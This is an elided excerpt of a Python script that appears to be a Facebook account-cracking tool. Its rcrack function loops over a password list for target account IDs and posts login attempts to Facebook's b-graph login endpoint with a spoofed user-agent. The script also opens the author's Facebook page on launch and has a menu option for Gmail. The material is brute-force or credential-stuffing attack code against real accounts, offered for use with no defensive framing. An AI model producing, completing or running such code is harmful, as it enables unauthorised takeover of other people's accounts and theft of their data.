...
import os,base64
os.system('xdg-open https://www.facebook.com/nayem0242')
...
def menu(): 
	...
	if xd in ['1','01']:
	   ...
	   gmail()
		...
		os.system(f'xdg-open https://www.facebook.com/nayem0242/ ');menu()
...
def rcrack(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			'user-agent': pro}
			lo = session.post('https://b-graph.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
